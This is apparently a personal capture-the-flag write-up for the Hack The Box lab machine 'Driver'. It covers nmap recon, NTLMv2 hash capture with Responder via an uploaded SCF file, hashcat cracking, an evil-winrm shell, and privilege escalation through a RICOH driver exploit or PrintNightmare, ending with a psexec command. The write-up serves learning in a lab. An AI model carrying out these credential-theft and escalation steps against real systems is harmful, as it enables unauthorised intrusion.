202212131256
Status: #idea
Tags: [[Labs]]

# Driver
IP: 10.10.11.106

## Recon

Ports Open:

```
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

Full Nmap Scan:

```
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Network Distance: 2 hops
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2022-12-14T01:00:02
|_  start_date: 2022-12-14T00:51:24
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

Port 80:

- Asks for credentials
	- Credentials Guessed: `admin:admin`
- Domain name found in footer: `driver.htb`
- Site allows us to upload a file to the file share that will be reviewed.

## Exploitation

- We upload a SCF file and listen with responder to retrieve NTLMv2 hashes:

```
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:92c04bcd3c9dceeb:8AA48E8082BB616D6F95508CE1688A5D:010100000000000000B6E3C0F70ED901ACA49D4C9D46D1B20000000002000800530038004100490001001E00570049004E002D005100540056004300420033005200510053003700310004003400570049004E002D00510054005600430042003300520051005300370031002E0053003800410049002E004C004F00430041004C000300140053003800410049002E004C004F00430041004C000500140053003800410049002E004C004F00430041004C000700080000B6E3C0F70ED901060004000200000008003000300000000000000000000000002000002F3094ACFF0C39B4B868896A492D51E7C441BDAB265429322DC7AC04E1ECCAE30A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003600000000000000000000000000
```

- Using hashcat, we crack the hash and find the password for `tony`:

```
hashcat.exe -m 5600 hash.txt rockyou.txt # Done in Windows OS

TONY::DRIVER:92c04bcd3c9dceeb:8aa48e8082bb616d6f95508ce1688a5d:010100000000000000b6e3c0f70ed901aca49d4c9d46d1b20000000002000800530038004100490001001e00570049004e002d005100540056004300420033005200510053003700310004003400570049004e002d00510054005600430042003300520051005300370031002e0053003800410049002e004c004f00430041004c000300140053003800410049002e004c004f00430041004c000500140053003800410049002e004c004f00430041004c000700080000b6e3c0f70ed901060004000200000008003000300000000000000000000000002000002f3094acff0c39b4b868896a492d51e7c441bdab265429322dc7ac04e1eccae30a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003600000000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
```

- Now we have credentials for tony: `tony:liltony`
- We use the credentials to get a shell with evil-winrm since we know that port 5985 is open.

## Post Exploitation

- Executing winPEAS:
- Loot:

```
C:\Users\All Users\ntuser.pol
C:\Users\All Users\RICOH_DRV
C:\Users\Default User
C:\Users\Default
C:\Users\All Users     
C:\Users\All Users\RICOH_DRV\RICOH PCL6 UniversalDriver V4.23     
```

- We discover hidden directories and files within the `\Users` directory
- We find a RICOH Printer driver version that is vulnerable and will give us privesc.
- Exploit:
`https://www.exploit-db.com/exploits/48036`

- We proceed to get a meterpreter shell by creating an executable with msfvenom and uploading it to our victim machine
- After executing the payload, we get a shell and learn to migrate to a `Session` of 1 rather than 0
- We use the exploit module and run it. Success, we are now root.

## Alternative Way

- Running the command: `impacket-rpcdump @10.10.11.106`
- We look for `Print System Remote Protocol`:

![[rpcdump_driver.png]](https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/rpcdump_driver.png)

- This tells us that it may be vulnerable to Print-Nightmare.
- Exploit: 
`https://github.com/calebstewart/CVE-2021-1675`

- We upload it to the victim machine and then Invoke-Nightmare
- It creates a user `adm1n:P@ssw0rd`
- We use these credentials to login with psexec.py:
`psexec.py DRIVER/adm1n:P@ssw0rd@10.10.11.106 cmd.exe`

- Finally, we are once again root.





---
# References
